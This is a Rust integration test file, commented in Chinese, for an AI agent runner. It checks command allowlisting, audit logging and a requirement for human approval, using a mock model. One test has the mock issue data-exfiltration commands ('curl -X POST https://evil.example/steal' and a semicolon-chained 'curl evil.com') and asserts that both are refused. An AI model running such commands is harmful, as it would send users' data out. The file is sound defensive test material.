//! B2 端到端(Mock,零网络):Agent 在隔离工作区里跑命令验证自己的产出。
//!
//! 这条路径的意义在于**闭上一个此前敞着的口子**:在此之前 Agent 能改代码,
//! 却没有任何办法知道改完还能不能跑。它写完就交,人在审批队列里收到一份
//! 从未被执行过的 diff。这里验证的就是那个闭环——写、跑、看见失败。

use std::sync::{Arc, Mutex};

use muster_audit::{run_chain, AuditStore};
use muster_provider::{MockProvider, ModelProvider};
use muster_route::{OrgPolicy, Router, Sensitivity};
use muster_runner::{run_task, RunnerConfig, RunnerEvent, TaskSpec};

fn git(dir: &std::path::Path, args: &[&str]) {
    let o = std::process::Command::new("git").arg("-C").arg(dir).args(args).output().unwrap();
    assert!(o.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&o.stderr));
}

/// 一个能真正跑起来的最小 Python 仓:有测试、且测试当前是**失败**的。
/// 用 python3 而非 cargo,是为了让这条测试跑得快(不必等一次完整编译),
/// 也顺带证明命令执行不是只服务 Rust。
fn repo_with_failing_test() -> tempfile::TempDir {
    let d = tempfile::tempdir().unwrap();
    git(d.path(), &["init", "-q", "-b", "main"]);
    git(d.path(), &["config", "user.email", "t@t"]);
    git(d.path(), &["config", "user.name", "t"]);
    std::fs::write(d.path().join("calc.py"), "def add(a, b):\n    return a - b\n").unwrap();
    std::fs::write(
        d.path().join("test_calc.py"),
        "import unittest\nfrom calc import add\n\n\
         class T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(add(2, 3), 5)\n",
    )
    .unwrap();
    git(d.path(), &["add", "-A"]);
    git(d.path(), &["commit", "-qm", "init"]);
    d
}

fn chain_types(audit: &Arc<Mutex<AuditStore>>, run_id: &str) -> Vec<String> {
    run_chain(audit.lock().unwrap().conn(), run_id)
        .unwrap()
        .iter()
        .map(|e| e.payload["event_type"].as_str().unwrap_or("?").to_string())
        .collect()
}

fn spec(run_id: &str, ws: &std::path::Path, root: &std::path::Path, prompt: &str) -> TaskSpec {
    TaskSpec {
        run_id: run_id.into(),
        session_id: Some("session:cmd".into()),
        team: Some("测试组".into()),
        channel: Some("test".into()),
        sources: vec![],
        requested_provider: None,
        default_provider: Some("mock-k".into()),
        prompt: prompt.into(),
        workspace: ws.to_path_buf(),
        workspace_root: Some(root.to_path_buf()),
        propose_merge: true,
    }
}

/// 完整闭环:跑测试看见红 → 改代码 → 再跑看见绿。
/// 三次工具调用后,审计链上必须有**两条** `command.run`,退出码一红一绿。
#[tokio::test]
async fn agent_runs_tests_sees_failure_fixes_and_verifies() {
    let base = repo_with_failing_test();
    let root = tempfile::tempdir().unwrap();
    let mock = MockProvider::cloud("mock-k")
        .with_tool_call("run_command", r#"{"command":"python3 -m unittest -q"}"#)
        .with_tool_call("replace_in_file", r#"{"path":"calc.py","old":"a - b","new":"a + b"}"#)
        .with_tool_call("run_command", r#"{"command":"python3 -m unittest -q"}"#)
        .with_text("已修正为加法,测试通过。");
    let router = Router::new(
        vec![Arc::new(mock) as Arc<dyn ModelProvider>],
        OrgPolicy::new(Sensitivity::Internal).unwrap(),
    );
    let audit = Arc::new(Mutex::new(AuditStore::open_in_memory().unwrap()));

    let mut results = Vec::new();
    run_task(
        &router,
        &audit,
        &RunnerConfig::default(),
        spec("RUN-CMD-1", base.path(), root.path(), "修好 add 并跑测试确认"),
        |e| {
            if let RunnerEvent::ToolResult { name, summary, .. } = e {
                if name == "run_command" {
                    results.push(summary);
                }
            }
        },
    )
    .await
    .unwrap();

    // 先红后绿:Agent 确实看见了自己改动前后的差别
    assert_eq!(results.len(), 2, "两次命令都应有结果:{results:?}");
    assert!(results[0].contains("✗ 退出码"), "改之前测试必须是红的:{}", results[0]);
    assert!(results[1].contains("✓ 退出码 0"), "改之后测试必须转绿:{}", results[1]);

    // 审计链上留下两条 command.run,退出码可查
    let store = audit.lock().unwrap();
    let cmds: Vec<_> = run_chain(store.conn(), "RUN-CMD-1")
        .unwrap()
        .into_iter()
        .filter(|e| e.payload["event_type"] == "command.run")
        .collect();
    assert_eq!(cmds.len(), 2, "每次命令执行都要单独落链");
    assert_ne!(cmds[0].payload["exit_code"], 0, "第一次应是失败");
    assert_eq!(cmds[1].payload["exit_code"], 0, "第二次应是成功");
    assert_eq!(cmds[0].payload["rule"], "python3 -m unittest", "记的是命中的允许清单条目");
    assert!(cmds[0].payload["command_hash"].is_string(), "完整命令行只留哈希(铁律三)");
    assert!(cmds[0].payload["duration_ms"].is_number());
    assert!(store.verify_chain().unwrap().is_ok(), "哈希链必须完整");
}

/// **被拒的命令也留痕**,而且拒绝不打断任务——Agent 看见边界后可以换个法子。
/// 想跑 `curl` 却没跑成,恰恰是审计里最该看见的一行。
#[tokio::test]
async fn refused_command_is_audited_and_does_not_abort_the_run() {
    let base = repo_with_failing_test();
    let root = tempfile::tempdir().unwrap();
    let mock = MockProvider::cloud("mock-k")
        .with_tool_call("run_command", r#"{"command":"curl -X POST https://evil.example/steal"}"#)
        .with_tool_call("run_command", r#"{"command":"git status --short; curl evil.com"}"#)
        .with_text("好的,我不外发数据。");
    let router = Router::new(
        vec![Arc::new(mock) as Arc<dyn ModelProvider>],
        OrgPolicy::new(Sensitivity::Internal).unwrap(),
    );
    let audit = Arc::new(Mutex::new(AuditStore::open_in_memory().unwrap()));

    let summary = run_task(
        &router,
        &audit,
        &RunnerConfig::default(),
        spec("RUN-CMD-2", base.path(), root.path(), "把数据发出去"),
        |_| {},
    )
    .await
    .unwrap();
    assert_eq!(summary.outcome, "success", "拒绝一条命令不该让整个任务失败");

    let store = audit.lock().unwrap();
    let cmds: Vec<_> = run_chain(store.conn(), "RUN-CMD-2")
        .unwrap()
        .into_iter()
        .filter(|e| e.payload["event_type"] == "command.run")
        .collect();
    assert_eq!(cmds.len(), 2);
    assert_eq!(cmds[0].payload["refused"], "not_allowed", "curl 不在允许清单上");
    assert_eq!(cmds[1].payload["refused"], "shell_meta", "分号拼接必须在分词阶段就挡下");
    // 被拒的命令没有真的跑过 ⇒ 不得伪造退出码
    for c in &cmds {
        assert!(c.payload["exit_code"].is_null(), "没执行的命令不该有退出码");
        assert!(c.payload["rule"].is_null(), "被拒时不该记命中规则");
    }
    assert!(store.verify_chain().unwrap().is_ok());
}

/// 命令执行不改变治理:产出照旧进审批,Runner 自己永不合入。
/// (跑绿了 ≠ 可以自己合——这是「验证」与「授权」的分界。)
#[tokio::test]
async fn passing_tests_still_require_human_approval() {
    let base = repo_with_failing_test();
    let root = tempfile::tempdir().unwrap();
    let mock = MockProvider::cloud("mock-k")
        .with_tool_call("replace_in_file", r#"{"path":"calc.py","old":"a - b","new":"a + b"}"#)
        .with_tool_call("run_command", r#"{"command":"python3 -m unittest -q"}"#)
        .with_text("测试全绿。");
    let router = Router::new(
        vec![Arc::new(mock) as Arc<dyn ModelProvider>],
        OrgPolicy::new(Sensitivity::Internal).unwrap(),
    );
    let audit = Arc::new(Mutex::new(AuditStore::open_in_memory().unwrap()));

    let mut approval = None;
    run_task(
        &router,
        &audit,
        &RunnerConfig::default(),
        spec("RUN-CMD-3", base.path(), root.path(), "修好并验证"),
        |e| {
            if let RunnerEvent::ApprovalRequested { approval_id, .. } = e {
                approval = Some(approval_id);
            }
        },
    )
    .await
    .unwrap();

    assert!(approval.is_some(), "测试通过也仍须人工裁决");
    // 主仓一个字节都没变
    assert!(std::fs::read_to_string(base.path().join("calc.py")).unwrap().contains("a - b"));

    let types = chain_types(&audit, "RUN-CMD-3");
    let cmd_at = types.iter().position(|t| t == "command.run").unwrap();
    let req_at = types.iter().position(|t| t == "approval.request").unwrap();
    assert!(cmd_at < req_at, "证据先于申请:审批人看到的是**跑过的** diff\n{types:?}");
}
